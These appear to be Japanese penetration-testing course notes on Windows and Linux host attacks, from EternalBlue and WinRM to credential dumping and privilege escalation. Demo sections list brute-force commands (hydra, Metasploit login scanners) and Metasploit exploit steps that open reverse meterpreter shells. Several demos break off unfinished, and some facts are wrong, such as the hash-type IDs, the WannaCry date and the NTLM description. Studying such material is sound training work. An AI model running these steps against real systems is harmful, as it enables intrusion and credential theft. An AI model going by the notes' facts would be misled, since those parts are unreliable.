攻撃の概要
ホストベース
システム/ホストベースの攻撃
・システム/ホストベースの攻撃とは、特定のOSを実行している特定のシステムやホストを標的にする攻撃。
・ネットワークサービス以外にもペンテスで狙う攻撃ベクトルになる。
・システム/ホストベースの攻撃は通常、ターゲットのネットワークにアクセスを得た後に用いる。
・システム/ホストベースの攻撃は、主にターゲットOSに内在する脆弱性を悪用することに焦点を当てている。
・システム/ホストベースの攻撃は、ネットワーク攻撃よりも専門的で、ターゲットのOSとそれへの影響を理解する必要がある。
・システム/ホストベースの攻撃は、ターゲットOS内の設定ミスや内在する脆弱性を悪用することを含む

windows
windowsの脆弱性
windowsの脆弱性の悪用
・windowsの脆弱性の種類
1) 情報開示：機密データへ攻撃者がアクセスできてしまう脆弱性
2) バッファーオーバーフロー：プログラミングの誤りによりバッファーに過剰なデータを書き込み、割り当てられたメモリアドレスを上書きしてしまう脆弱性
3) リモートコードの実行：攻撃者がターゲット上でリモートに任意のコードを実行できてしまう
4) 権限昇格：初期侵入後に攻撃者がより高い権限を取得できてしまう脆弱性
5) サービス拒否：攻撃者がシステムのリソースを枯渇させ、正常な動作を妨げる脆弱性

webdavの悪用
・IISは、マイクロソフトによって開発されたwindowsNTファミリ向けの独自の拡張可能なウェブサーバーソフトウェア
・Webサイトやウェブアプリケーションのホスティングに使用でき、管理者に対してwebサイト管理用の強力なGUIを提供する。
・IISは、ASP.NETやPHPで開発された静的・動的なwebページの両方をホストするために使用できる
・ポートは、80or443で動作するように構成する
・対応している実行可能なファイルの拡張子は、.asp、aspx、.config、.php

・webdavは、HTTPプロトコルの拡張機能のセットであり、ユーザーがリモートウェブサーバー上のファイルを共同で編集および管理できるようにする。
・webdavは、webサーバーを共同編集用のファイルサーバーとして機能させることが可能
・webdavは、microsoftIIS上で動作し、通常、80および443を使用する。
・webdavは、ユーザ名とパスコードが必要

・webdavへの悪用
1) IIS上でwebdavを動いていることを確認する
2) webdavに対して、ブルートフォース攻撃を行い、認証に使える認証を取得
3) webdavにログインして、悪意のある.aspペイロードをアップロードし、任意コマンドを実行してターゲット上でリバースシェルを取得する。

・webdavで使用できるツールは、davtestやcadaverがある。

demo webdavへのexploit
1) ポートスキャン
nmap -sC -sV target-ip
2) webdavがwindowsIIS上で動いているかを確認する
nmap -sV -p 80 --script=http-enum targetip
3) 以下のコマンドでブルートフォースを実行
hydra -L wordlist -P password directory targetIP http-get /webdav/

・webdavでは、検索ボックスで、dirで調べて、type C:\flagで中身を見る。


PsExecを使ったSMBのエクスプロイト
・SMB(Server Message Block)は、ローカルネットワーク上のコンピュータ間でファイルや周辺機器を共有するために使用されるネットワーク共有プロトコル
→SMBはポート445
・SAMBAは、Linux上のオープンソース実装で、WindowsシステムがLinuxの共有やデバイスにアクセスできるようにする。

・SMBプロトコルでは、2段階で認証を行う
1) ユーザー認証：ユーザーは共有にアクセスするために、SMBサーバーへ認証するときにユーザー名とパスコードを提供する必要がある
2) 共有認証：制限付きの共有にアクセスするために、ユーザーはパスワードを提供する

・PsExecは、Microsoftが開発した軽量のtelnetの代替ツールで、任意のユーザ資格情報を使ってリモートwindowsシステム上でプロセスを実行できる。
→PsExecの認証は、SMB経由で行う
→PsExecユーティリティを使うとターゲットシステムに正当な資格情報で認証して任意のコマンドを実行したり、、リモートのコマンドプロンプトを起動したりする
→RDPに似ているが、GUIでリモート操作する代わりにCMD経由でプロセスを実行するという点が異なる

・PsExecを利用してWindowsのターゲットにアクセスするためには、正当なユーザアカウントとそのパスコードまたはパスワードハッシュを特定する必要がある
・これはさまざまな手法を利用できるが、最も一般的なのは、ブルートフォース攻撃である
・ブルートフォースの対象は、一般的なwindowsユーザアカウントのみに絞る
・資格情報を得た後、それを使ってPsExec経由でターゲットに認証し、任意のシステムコマンドを実行したりリバースシェルを取得したりすることが可能。

windows ms17-010 smb脆弱性（eternal blue)
・Eternalblueは、Windowsの一連の脆弱性とそれを突くエクスプロイトにつけられた名称でこれにより攻撃者は任意コードをリモート実行してWindowsシステムへ侵入して結果的にそのシステムに属するネットワークにもアクセスを広げることができる。
・Eternalblueは、NSAによってMS17-010の脆弱性を悪用する手法として作られ、2017年にshodow brokersによって流失した
・このエクスプロイトは、smbv1プロトコルの脆弱性をつき、攻撃者が特殊に細工したパケットを送ることで任意のコマンド実行を可能にするもの

・eternalblueエクスプロイトは、2017年6/27に発生したWannacryランサムウェア攻撃で使用され、windowsシステムを次々と感染させ、多くのシステムに拡大した

・metasploitでは、検出用のauxiliaryと攻撃用のexploitモジュールが用意されている。
・攻撃に成功すると、特権付きmeterpreterセッションを得ることが多いので、横展開に有効

demo eternalblueのexploit
1) nmap -p 445 --script=smb-vuln-ms17-010 targetIP
2) msfconsole 
3) use exploit/windows/smb/ms17_010_eternalblue
4) RHOSTでターゲットIPとLHOSTで自分のIPを設定
5) set PAYLOAD windows/x64/meterpreter/reverse_top
6) set LPORT 4444
7) exploit



1) githubからのclone(autoblue-ms17-010)
2) cd shellcode
3) chmod +x shell_prep.sh
4) ./shell_prep.sh
5) y
6) LHOST for reverse connectionでmy ipを設定
7) LPORTでx64リッスンするポートの設定
8) LPORTでx86リッスンするポートの設定
9) regular cmd shellを選択
10) stagelessのペイロードを設定
11) ls -alで自分の悪用を確認する


RDP(remote desktop protocol) exploit
・RDPは、Microsoftが開発した独自のGUIリモートアクセスプロトコルで、windowsシステムにリモート接続して操作するために使用される
・RDPはデフォで、3389を使用するが、設定で変更可能
・RDPの認証には、ターゲットシステム上の正当なユーザアカウントと、そのユーザーのパスコードが必要
・RDPに対してブルートフォースを行うことで、ユーザーの認証情報を得れる。

・xfreerdpを使用して、RDP経由でウィンドウズターゲットにリモートアクセスするには、以下のコマンドを使用する。
xfreerdp /u:管理者 /p：パスワード /v:ターゲットIP：ポート番号

cve-2019-0708-bluekeep
demo
1) 

winRM exploit
・Windows Remote Managementは、windowsのリモート管理プロトコルでHTTPSを使ってWindowsシステムへのリモートアクセスを容易にするために利用できる
・Microsoftは、winrmをwindowsに実装した。
・winrmの用途は以下のようになる
1) ローカルネットワーク上のwindowsホストにリモートでアクセスしてやり取りする。
2) windowsシステムにリモートでアクセスしてコマンドを実行する
3) windowsシステムを遠隔で管理・設定する。
・winrmは通常TCPポート5985(HTTP)および5986(HHTTPS)を使用する

・winrmは、さまざまな認証方式を通じてシステム間の通信に対するアクセス制御とセキュリティを実装
・「crackmapexec」というユーティリティを使ってwinrmに対してブルートフォースを実行し、ユーザ名とパスコードを特定し、ターゲット上で実行する
・rubyスクリプトの「evil-winrm」を利用して、ターゲットシステム上でコマンドシェルセッションを取得できる

demo winrm:msfによるエクスプロイト
1) nmap --top-ports 7000 target domain
2) msfconsole
3) 基本情報の設定
use auxiliary/scanner/winrm/winrm_login
set RHOSTS target
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
set PASSWORD anything
exploit
4) 以下のコマンドで認証方法を確認する
use /auxiliary/scanner/winrm/winrm_auth_methods
set RHOSTS target
exploit
5) winrm_cmdと3)で得た認証情報を使って悪用する
use auxiliary/scanner/winrm/winrm_cmd
set RHOSTS target
set USERNAME
set PASSWORD
set CMD whoami
exploit
6) winrm_script_execエクスプロイトモジュール（使う認証は、3)で取得したもの）を使用して、meterpreterを取得
use exploit/windows/winrm/winrm_script_exec
set RHOSTS target
set USERNAME
set PASSWORD
set FORCE_VBS true
exploit
7) cd /
8) dir
9) cat flag.txt

windowsの権限昇格
windows kernel exploits
・権限昇格とは、システム内の脆弱性や設定ミスを悪用し、あるユーザから別なユーザへ権限を引き上げるプロセスのこと
・権限昇格は、攻撃ライフサイクルで極めて重要な要素であり、ペンテスト全体の成功を左右する主要な要因
・ターゲットシステムへの足がかりを手に入れた後に、管理者権限が必要なタスクや機能を実行するために権限を昇格させる必要がある。

・カーネルとは、OSの中核となるプログラムで、システム上のあらゆるリソースやハードウェアを完全に制御する。
→ハードウェアとソフトウェアの通信を仲介する。
・カーネルは、主に以下の二つの動作モードからなり、これらがシステムリソースやハードウェアへのアクセスを決定する。
1) ユーザモード：ユーザモードで動作するプログラムやサービスは、システムリソースや機能へのアクセスが制限される。
2) カーネルモード：カーネルモードはデバイス管理やシステムメモリの管理などを含み、システムリソースや機能への無制限のアクセス権を持つ

・windows上でのカーネル悪用は、通常windowsカーネル内の脆弱性を標的とし、任意のコードを実行することで特権システムコマンドを動かすまたはシステムシェルを取得するために行う。
・このプロセスはターゲットなるWindowsのバージョンや使用するカーネル悪用の種類によって異なる
・Windowsシステム上での権限昇格は通常以下の手順で行う
1) カーネルの脆弱性の特定
2) カーネルエクスプロイトをダウンロード・コンパイルし、ターゲットシステムに転送する。

demo
1) sessions
2) getuid：現在実行中のプロセスがどのユーザIDで動作しているかを取得するためのコマンド
3) getprivs：システム上の現在のユーザまたはプロセスが持っている権限の一覧を取得するためのコマンド
4) getsystem：windows環境において現在のユーザからシステム最高の権限を持つsystemアカウントへと特権を昇格させるために使われるコマンド

・ローカルエクスプロトサジェスタは、複数のOSで動作し、

windowsターゲット上のカーネルエクスプロイトを識別するために使用できるmetasploitモジュールは、multi/recon/local_exploit_suggester


UACMeでUACをバイパスする
・User account control(UAC)は、windows vistaで導入されたWindowsのセキュリティ機能で、OSに対する不正な変更を防止するために使用される。
・UACは、OSへの変更が管理者またはローカル管理者グループに属するユーザーアカウントの承認を必要とすることを保証するために使用
・管理者権限が必要なプログラムを実行しようとする非特権ユーザは、UACの認証入力が必要。
管理者の場合は、確認プロンプトが表示される
・攻撃者は、昇格された権限で悪意のある実行ファイルを実行するためにUACをバイパスすることがある。

・UACを正常にバイパスするためには、ターゲットのwindowsシステム上でローカル管理者グループに属するユーザアカウントへのアクセスが必要
・UACは、管理者権限でプログラムを実行できる仕組みであり、その際にユーザーに確認プロンプトを表示する。
・UACには、複数の整合性レベルがあり、低から高まで設定可能で、保護レベルが「高」より低く設定されている場合、
Windowsプログラムは認証プロンプトなしで昇格権限を持って実行されることがある。
・UACをバイパスするために使われるツールや手法は複数存在する。
ただし、使用するツールや手法はターゲットwindowsバージョンによって異なる。


アクセストークンのなりすまし
・Windowsアクセストークンは、Windowsにおける認証プロセスの中核的な要素であり、ローカルセキュリティ機関サブシステムサービスによって作成・管理される。
・Windowsアクセストークンは、システム上で動作するプロセスやスレッドのセキュリティコンテキストを識別・記述する役割を持つ
→アクセストークンは一時的なキーのようなもので、webのクッキーに似た仕組み
・アクセストークンは、ユーザが認証に成功するたびに、winlogon.exeプロセスによって生成される
→このトークンには、スレッドやプロセスに関連するユーザアカウントの識別情報と権限情報が含まれる
　その後、このトークンはuserinit.exeプロセスにアタッチされて、ユーザによって開始された全ての子プロセスは、生成元からアクセストークンのコピーを継承し、同じアクセストークンの権限下で実行される。

・windowsアクセストークンは、それぞれに割り当てられたさまざまなセキュリティレベルに基づいて分類される。これらのセキュリティレベルは、特定のトークンにどの権限が割り当てられるかを決定するために使用する。
・アクセストークンは通常、以下のいずれかのセキュリティレベルが割り当てられる。
1) impersonateレベルのトークン：windows上での非対話ログオンの直接的な結果として作成される
→ローカルシステム上でトークンの成り替わりに利用できるが、そのトークンを利用する外部システム上では成り変われない
2) delegateレベルのトークン：通常は対話的ログオンによって作成される
→任意のシステム上でトークンの成り替わりができるため脅威

quiz
・アクセストークンを偽装するには、「selmersonateprivilege」権限を持つアカウントにアクセスできる必要がある
・ユーザ権限の列挙に使用できるのは、getprivs

windowsファイルシステムの脆弱性
・ADSは、NTFSのファイル属性でmacOSのHFSとの互換性を持たせるために設計された
・NTFSで作成されたファイルは２種類のフォークとストリームを持つ
1) データストリーム：ファイルのデータ本体を格納する規定ストリーム
2) リソースストリーム：通常のファイルのメタデータを格納するストリーム
・攻撃者は、ADSを使って、正規ファイルの中に悪意のあるコードや実行ファイルを隠し、検出を回避する
・これは、正規ファイルの属性であるリソースストリームに悪意のあるコードや実行ファイルを格納することでお行われる。
・この手法は、シグネチャベースの基本的なアンチウイルスや静的なスキャンツールを回避するために使用できる。

windowsクレデンシャル
windows password hashes
・windows OSは、ハッシュ化されたユーザアカウントのパスワードをローカルのSAMデータベースに保存する。
・ハッシュ化とはあるデータ片を別の値に変換する処理のこと
→ハッシュ関数やアルゴリズムを使ってハッシュ値を生成する。ハッシュ関数の出力をハッシュ値という。
・windowsの古いバージョンでは、LNとNTLMの２種類のハッシュを利用していた。

・SAMは、windowsのユーザアカウントとパスワードを管理するデータベースファイルで、SAMデータベースに保存されている全てのユーザアカウントのパスワードはハッシュ化される
・SAMデータベースファイルは、OSが実行中の間はコピーできない
・WindowsNTカーネルはSAMデータベースをロックした状態に保つ。そのため、攻撃者は通常、メモリ内の手法やツールを利用して、LSASSプロセスからSAMハッシュをダンプする。
・最新のバージョンでは、SAMデータベースは、syskeyで暗号化される。

・LMは、NT4.0より前のwindowsOSに実装されていた既定のハッシュアルゴリズム
・このプロトコルはユーザのパスコードをハッシュ化するために使用され、ハッシュの手順は以下のように行う
1) パスワードを7文字の2ブロックに分ける
2) 全ての文字を大文字に変換する
3) 各ブロックをDESアルゴリズムで個別にハッシュ化する
・LMハッシュは一般に弱いプロトコルとみなされて、容易にクラッキングされる。
→主な理由は、ハッシュにソルトがないので、ブルートフォースやレインボーテーブルが有効になりやすい。

・NTLMは、windowsにおいてコンピュータ間の認証を行うために利用される認証プロトコル群で認証プロセスでは、ユーザ名とパスコードで行う
・windosVita以降では、LMハッシュは無効化されて、NTLMハッシュを利用している。
・ユーザアカウントが作成されるとパスコードはMD4ハッシュアルゴリズムによって暗号化され、元のパスコードは破棄される
・NTLMは、以下の点でLMよりも改善される
1) ハッシュを２つのチャンクに分割する
2) 大文字と小文字を区別する
3) 記号やユニコードの使用を許可する。

windows構成ファイル内のパスコードの検索
・windowsは、複数のシステムへの一括展開やインストールなどの繰り返し作業を自動化することができる
・これは通常、unattended windows setupゆーテリティで行う。
このツールは、windowsの大量のインストールやデプロイを自動化するために使用される
・このツールは、特定の設定内容やユーザアカウントの認証情報を含む設定ファイルを利用する
・もし、unattened windows setupの設定ファイルがインストール後にターゲットシステム上に残っている場合にはそれらのファイルからユーザアカウント情報が漏洩する可能性がある。
攻撃者がそれを利用して、正規の資格情報としてwindowsターゲットに認証することができる

・unattened windows setupユーティリティは、通常、ユーザアカウントやシステム設定情報を含むいずれかの構成ファイルを利用する
1) c:\windows\panther\unattend.xml
2) c:\windows\panther\autounattend.xml
・unattened windows setupの構成ファイルに格納されているパスコードはBase64エンコードされている場合がある。

Mimikatzを用いたダンプハッシュ
・Mimikatzは、benjamin delpyによって作成されたwindowsのポストエクスプロイトツール
→これによりメモリ上から平文パスワードやハッシュ値、Kerberosチケットを抽出できる
・SAMデータベースはwindowsシステム上にあるハッシュ化されたユーザパスワードを保存するデータベースファイル
・Mimikatzは、KSASS.exeプロセスメモリからハッシュを抽出するために使用できる
・事前にコンパイルされた、mimikatz実行ファイルを使用できる。

Pass the hash attacks
・Pass the hashは、HTLMハッシュや平文パスコードをキャプチャ/収集し、それらを使ってターゲットへ正規の認証としてログインする攻撃手法
・pass the hash攻撃では、以下のツールが使用できる
1) metasploitのpsexecモジュール
2) crackmapexec
・この手法は、サービスの脆弱性ではなく正当な資格情報を使ってターゲットシステムにアクセスを得ることを可能にする

Linuxの脆弱性
よく悪用されるLinuxの脆弱性
・Linuxは、linus Torvaldsによって開発されたLinuxカーネルとRicard Stallmanが始めたGNUツールキットで構成される無料のオープンソースOS
・これらのオープンソースソフトウェアの組み合わせによってLinuxOS全体が形成され、一般にGNU/Linuxと呼ばれる。
・Linuxはサーバ用途で使用されることが多い。したがってLinuxサーバ上では、特定のサービスやプロトコルが稼働していることが多くある。
・これらのサービスは、攻撃者がターゲットホストへアクセスするために使用できる攻撃ベクトルを提供する。

・頻繁に悪用されるLinuxサービス
プロトコル/サービス　　　　　　　　ポート番号 　　　　　　用途       
Apache Web Server  　　　　　　80/443　　　　　apache web server 2.0の下で公開されたクロスプラットフォームのフリーでオープンソースのwebサーバー
　　　　　　　　　　　　　　　　　　　　　　　　　　世界のwebサーバの80%を占める。
SSH　　　　　　　　　　　　　　　　22　　　　　　　SSHは暗号化されたリモートアクセスプロトコルで、信頼できないネットワーク越しにシステムへ安全にリモート操作するために使用される

FTP　　　　　　　　　　　　　　　　21　　　　　　　FTPは、サーバとクライアント間でのファイルの共有に使用する

SAMBA                         445　　　　　　SambaはLinux上でのSMBの実装で、windowsシステムがLinux共有にアクセスできるようにする。

Linuxの脆弱性の悪用
shellshock
・shellshockは、bashシェルに存在する脆弱性に名付けられた名称
これらの脆弱性により攻撃者はBashを介してリモートで任意のコマンドを実行でき、結果としてリバースシェル等でターゲットリモートアクセスを取得できる
・shellshockは、2014年9/12に発見され、同年9/24に公表された

・shellshock脆弱性は、bashの不具合によって引き起こされ、Bashが(){:;};のような文字列の後に続くコマンドを誤って実行してしまう問題
・この脆弱性はLinuxのみに影響する。
・windowsでは、bashを利用していないので、影響は受けない
・リモート攻撃の文脈では、CGIスクリプトを実行するように設定されたApache webサーバの攻撃の対象となる。
・CGIスクリプトは、apacheがlinuxシステム上で任意のコマンドを実行するために使用する仕組みであり、その出力結果がユーザに返される。

FTPの悪用
・FTPは、TCPポート21を使用するプロトコルでサーバとクライアント間の共有を行うために利用する。
・FTPは、webserverのディレクトリとの間でファイルを送受信する手段として頻繁に使用される
・FTP認証では、ユーザ名とパスコードが必要
→アタッカーは、ブルートフォースを行った正しい認証情報を得ることが可能
・FTPの一部のサーバーでは、匿名アクセスを許可するように設定されている場合があり、認証なしに誰でもアクセスできてしまう。

・proFTPd

demo FTPの悪用
1) nmap -sC -sV target
2) hydra -L /ユーザディレクトリ -P /パスコードディレクトリ target -t 4 ftp

SSHの悪用
・SSHは、暗号化を提供するリモート管理プロトコルでは、telnetの後継にあたる
・サーバーやシステムへのリモートアクセスに使用される。
・SSHは、デフォルトで22を使用するが、任意のポートに設定することが可能
・SSHの認証は、次の２つの方法で構成できる
1) ユーザ名とパスコードによる認証
2) 鍵ベースの認証
・クレデンシャルがユーザ名とパスコードであればブルートフォースによりシステムへのアクセスが可能

demo
1) nmap -sC -sV target
2) msfconsole
3) search type:auxiliary name:ssh
4) use auxiliary/scanner/ssh/ssh_version
5) run
6) use auxiliary/scanner/ssh/ssh_login
7) exploit
8) sessions 
9) sessions -i 1

SAMBAの悪用
・SMBは、ローカルネットワーク上でコンピュータ間のファイルや周辺機器の共有を行うためのネットワーク共有プロトコル
・SMBは、ポート445を使用する。元々は、netbios上で動作し、ポート139を使用していた
・sambaは、linux上でsmbの実装であり、windowsシステムがlinuxの共有やデバイスにアクセスできる

・SAMBAはサーバやネットワーク共有へアクセスするために、ユーザ名とパスコード認証を使用する
・SAMBAサーバに対してブルートフォースを実施し、正当な認証情報得る。
・正当な認証情報得た後に、SMBMapというユーティリティを使って以下のことができます。
1) Samba共有ドライブの列挙
2) 共有の一覧表示
3) ファイルのダウンロード
4) ターゲット上でのリモートコマンドの実行
・smbclientを使用することによりサーバからローカルへファイルをダウンロードしたりローカルからサーバーへファイルをアップロードしたりサーバ上でのディレクト情報の取得を行う。

Linuxカーネル悪用
・Linuxのカーネルエクスプロイトは通常、Linuxカーネル内の脆弱性を狙い、任意のコードを実行して特権コマンドを走らせる/システムシェルを取得することを目的
・この手法はターゲットのカーネルのバージョンやディストリビューションなどの使うエクスプロイトによって手順が異なる。
・Linux上での権限昇格の流れは以下のようになる。
1) カーネルの脆弱性を特定する
2) 該当するカーネルエクスプロイトをダウンロード・コンパイルして、ターゲットへ転送する。
3) エクスプロイトを実行して特権を取得する。

Cron
・LinuxはCronというユーティリティでタスクのスケジューリングを実装している。
・Cronは時間ベースのサービスで、アプリケーションやスクリプト、その他のコマンドを指定したスケジュールで繰り返し実行する。
・Cronに繰り返されるように設定されたアプリケーションやスクリプトを「cronジョブ」と呼ぶ。
→Cronは日次バックアップからシステムのアップグレードやパッチ適用まで様々な処理の自動化に使用できる。
・crontabファイルは、cronユーティリティが作成されたcronジョブを保存・追跡するための設定ファイル

・cronジョブはシステム上の任意のユーザとして実行されることがあり、特にrootユーザとして実行されるcronジョブを注視することが重要
・その理由は、cronジョブによって実行されるスクリプトやコマンドは実行ユーザの権限で動作するため、結果的に我々にroot権限を与えてしまう可能性がある
・権限を昇格するためには、rootによってスケジュールされたcronジョブやそのcronジョブが処理しているファイルを見つけて特定する必要がある。

Exploit SUID Binaries
・Linuxには、通常のファイルのアクセス権に加えて、特定の状況で使える特殊なパーミッションがSUID権限
・SUIDが付与された場合は、そのスクリプトやバイナリを実行するユーザではなく、ファイル所有者の権限で実行される
・SUIDは通常、権限のないユーザに対して特定のスクリプトやバイナリを「root」権限で実行させるために使用する。
→あくまで、SUIDは、スクリプトやバイナリの実行に限られるため、全権の権限昇格ではない
・しかし、SUIDが誤設定されていたり、対象バイナリ/スクリプト内に脆弱性があると権限のないユーザがそれを悪用してroot権限のセッションを取得することが可能

・SUIDバイナリの悪用の成功は、以下の要因に依存する。

Linuxのパスワードハッシュのダンプ
・Linuxはマルチユーザをサポートしているため、複数のユーザが同時にシステムにアクセスできる
→セキュリティの観点では、アカウントが増えれば増えるほど攻撃者にとってにアクセスポイントも増えるので、サーバ全体のリスクも高まる
・Linux上のすべてのアカウント情報は、/etc/passwdに格納されている。
・passwdファイル内のパスワードは、暗号化/ハッシュ化されているので、/etc/passwdはシステム上の任意のユーザから読み取り可能でもパスワード自体は表示されない
・ユーザの暗号化されたパスワードは、/etc/shadowに保存されている。
・/etc/shadowファイルはrootのみ読み取りが可能

・passwdファイルには、使用されているハッシュアルゴリズムと実際のパスワードハッシュに関する情報が含まれる。
→これを使用すると、ハッシュアルゴリズムの種類と強度を特定できる
・どのアルゴリズムが使われているかは、ユーザ名の後にある$記号に続く番号を見ることで判断できる。
値　　　　　ハッシュアルゴリズム
$1　　　　　MD5
$2　　　　　Blowfish
$3　　　　　SHA-256
$4　　　　　SHA-512

Demo password cracker
1) ping -c 4 target
2) nmap -sS -sV target
3) nmap --script=vuln -p num_port target
4) 



